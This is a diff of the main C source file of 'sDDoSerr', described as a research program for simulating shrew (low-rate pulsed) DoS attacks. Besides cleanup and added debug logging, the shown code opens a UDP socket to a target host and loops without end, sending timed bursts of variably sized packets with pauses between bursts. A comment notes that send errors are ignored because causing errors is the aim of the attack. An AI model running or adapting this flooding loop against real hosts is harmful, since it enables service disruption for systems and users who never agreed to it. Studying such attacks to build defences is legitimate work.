@@ -1,11 +1,11 @@
 /** 
-  * sDDoSerr - the programm for simulate shrew (D)DoS attack.
+  * sDDoSerr - the research programm for simulate shrew (D)DoS attack.
   * 
   * Основной модуль программы.
   * 
-  * v.1.4.1.24a от 10.05.21.
+  * v.1.4.2.25a от 11.05.21.
   * !Не забывать изменять *argp_program_version 
-  * под новую версию в парсере (cmd_parser.c)!
+  * под новую версию в парсере (cmd_parser.c), стр. 81!
   **/
 
 /**
@@ -90,9 +90,8 @@ int get_current_time ()
     return 0;
 }
 
-/** Функция получения точного времени в миллисекундах. 
- *  Мало точности, надо хотябы в микросекундах! **/
-/*
+/* Функция получения точного времени в миллисекундах. 
+ *  Мало точности, надо хотябы в микросекундах!
 long long int get_time ()
 {
   struct timeb timer_msec;
@@ -134,7 +133,7 @@ void term_nonblocking()
     {
         struct termios newt;
         tcgetattr(STDIN_FILENO, &stdin_orig);
-        fcntl(STDIN_FILENO, F_SETFL, O_NONBLOCK); // non-blocking
+        fcntl(STDIN_FILENO, F_SETFL, O_NONBLOCK); //non-blocking
         newt = stdin_orig;
         newt.c_lflag &= ~(ICANON | ECHO);
         tcsetattr(STDIN_FILENO, TCSANOW, &newt);
@@ -160,7 +159,6 @@ int main (int argc, char *argv[])
     
     /* Запуск функции сдвоенного парсера и получение на выходе
      * структуры со всеми настройками программы. */
-    //!printf("Запуск функции парсера. \n");
     struct Settings *settings = parser(argc, argv);
     if (settings->host == NULL)
     {
@@ -177,10 +175,10 @@ int main (int argc, char *argv[])
     }
 
     if (settings->debug == 1) //Если установлен флаг дебага.
-        {printf("Запуск функции парсера выполнен. \n");}
-    
-    if (settings->debug == 1)
-        {printf("Запуск функции создания сокета. \n");}
+        {
+            printf("Запуск функции парсера выполнен. \n");
+            printf("Запуск функции создания сокета. \n");
+        }
         
     /* Вызов функции открытия сокета 
      * с передачей ей структуры настроек. */
@@ -192,15 +190,9 @@ int main (int argc, char *argv[])
     
     /* Массив из рандомных -дельт от максимальной длины сообщения. */
     int message_deltas[settings->num_deltas];
-    //printf("Sizeof message_deltas: %i \n", sizeof(message_deltas));
     
     //Инициализация генератора псевдорандомных чисел 
     //(тут seed - текущее время).
-    
-    //time_t t;
-    //srand((unsigned) time(&t));
-    
-    //srand(time(0));
     srandom(time(0));
     
     if (settings->debug == 1)
@@ -211,7 +203,6 @@ int main (int argc, char *argv[])
     /* Заполнение массива -дельт псевдорандомными числами. */
     for (int j = 0; j <= settings->num_deltas; j++)
         {
-            //message_deltas[j] = rand() % (settings->message_size-1);
             message_deltas[j] = random() % (settings->message_size-1); 
             //От 0 до % максимум-1.
     //Т.е. при задании .. % 50 будут генерироваться числа от 0 до 49.
@@ -220,8 +211,6 @@ int main (int argc, char *argv[])
             if (settings->debug == 1)
                 {printf("Message_deltas [%i]: %d \n", j,\
                     message_deltas[j]);}
-            //printf("Message_deltas0 [%i]: %d \n", j,\
-            random() % settings->message_size-1);
         }
     }
     if (settings->num_deltas == 0)
@@ -246,13 +235,11 @@ int main (int argc, char *argv[])
     if ((message_full = \
     //malloc(settings->message_size*sizeof(char))) == NULL)
     malloc(settings->message_size*sizeof(char)+1)) == NULL) 
-    //+1 чтобы работало правильно, но не помогло.
+    //+1 чтобы терминация работала правильно.
         {
             printf("Ошибка выделения памяти под полное сообщение! \n");
             fprintf(log, "%s \n",\
                       "Ошибка выделения памяти под полное сообщение!");
-            //Очистка динамической памяти под полное сообщение.
-            //free(message_full);
             
             //Очистка динамической памяти под структуру настроек.
             free(settings);
@@ -262,7 +249,8 @@ int main (int argc, char *argv[])
                 
             //Закрытие файла лога.
             fclose(log);
-                
+            
+            //Выход
             exit(EXIT_FAILURE);
         }
     
@@ -283,12 +271,10 @@ int main (int argc, char *argv[])
         {
             printf("Полное сообщение: %.*s \n", settings->message_size,\
             message_full);
-            //printf("Полное сообщение s: %s \n", message_full); - ошибки.
         }
             
     if (settings->debug == 1)
         {printf("Вход в цикл отправки одной пачки. \n");}
-    //printf("settings->pack_size %i \n", settings->pack_size);
     
     
     /* Запись указателя на начало полного сообщения 
@@ -312,6 +298,9 @@ int main (int argc, char *argv[])
     
     /** Бесконечный цикл на отправку "пачек" пакетов с паузой **/
     //Для дебага.
+    //Счётчик итераций полного цикла.
+    //Может переполниться при длительном использовании программы
+    //со включенным дебагом!
     long long int cycle_counter = 0;
     
     /* Вызов функции неблокируемого ввода в терминал 
@@ -375,10 +364,8 @@ int main (int argc, char *argv[])
             {
                 printf("%lli-я итерация полного цикла. \n",\
                 cycle_counter);
-                fprintf(log, "%lli%s \n",\
+                fprintf(log, "%lli%s \n\n",\
                 cycle_counter, "-я итерация полного цикла.");
-                //(файл или поток как файл, форматирование (полное), 
-                //потом данные.)
                 
                 printf("Пауза между 'пачками': %i сек. %li нс. \n",\
                 ns_time_s, ns_time_ns);
@@ -392,7 +379,6 @@ int main (int argc, char *argv[])
                 pack_start_time = get_time();
             }
     
-    //int delta, di = 0; //Временные переменные для цикла.
     int di = 0; //Счётчик итерации для дельт.
     for (int i = 1; i <= settings->pack_size; i++)
     {
@@ -400,8 +386,6 @@ int main (int argc, char *argv[])
             {
                 printf("%i-я итерация цикла пачки. \n", i);
                 fprintf(log, "%i%s \n", i, "-я итерация цикла пачки.");
-                //(файл или поток как файл, форматирование (полное), 
-                //потом данные.)
             }
             
         
@@ -423,7 +407,6 @@ int main (int argc, char *argv[])
         
         
         /* Размер кропнутого сообщения. */
-        //message_struct.mes_size = message_size - delta;
         message_struct.mes_size = \
         settings->message_size-message_deltas[di];
         
@@ -459,7 +442,6 @@ int main (int argc, char *argv[])
             }
     
         
-        //int udp_send = udp_sender (udp_socket, message_struct);
         int udp_send;
         if (udp_send = udp_sender (udp_socket, message_struct) != 0)
             {   
@@ -470,23 +452,6 @@ int main (int argc, char *argv[])
                 /*            
                  * Не нужно выходить из программы при ошибке отправки,
                  * т.к. создание ошибок - цель атаки. :)
-                 * 
-                //Если при отправке сообщения что-то пошло не так.
-                printf("Упс. При отправке пакета что-то пошло не так."\
-                "\n");
-                fprintf(log, "%s\n",\
-                "Упс. При отправке пакета что-то пошло не так.");
-                
-                //Очистка динамической памяти под полное сообщение.
-                free(message_full);
-                
-                //Закрытие сокета.
-                int udp_close = udp_closer (udp_socket);
-                
-                //Закрытие файла лога.
-                fclose(log);
-                
-                exit(EXIT_FAILURE);
                 */
             }
         
@@ -499,6 +464,10 @@ int main (int argc, char *argv[])
                 message_time = message_end_time - message_start_time;
                 printf("Затраченное время на отправку сообщения:"\
                 " %lld мкс \n", message_time);
+                
+                fprintf(log, "%s %lld%s \n\n",\
+                "Затраченное время на отправку сообщения: ",\
+                message_time, " мкс.");
             }
         
     }
@@ -510,8 +479,12 @@ int main (int argc, char *argv[])
                 pack_end_time = get_time();
                 
                 pack_time = pack_end_time - pack_start_time;
-                printf("Затраченное время на отправку 'пачки' пакетов"\
+                printf("Затраченное время на отправку 'пачки' пакетов:"\
                 " %lld мкс. \n", pack_time);
+                
+                fprintf(log, "%s %lld%s \n",\
+                "Затраченное время на отправку 'пачки' пакетов: ",\
+                pack_time, " мкс.");
             }
     
     /** Вызов ф-ции nanosleep() для создания паузы 
@@ -535,7 +508,12 @@ int main (int argc, char *argv[])
             {                
                 end_time = get_time();
                 elapsed_time = end_time - start_time;
-                printf("Время полного цикла: %lld мкс.\n", elapsed_time);
+                printf("\nВремя итерации полного цикла: %lld мкс.\n",\
+                elapsed_time);
+                
+                fprintf(log, "\n%s %lld%s \n\n\n",\
+                "Время итерации полного цикла: ",\
+                elapsed_time, " мкс.");
             }
     
     }
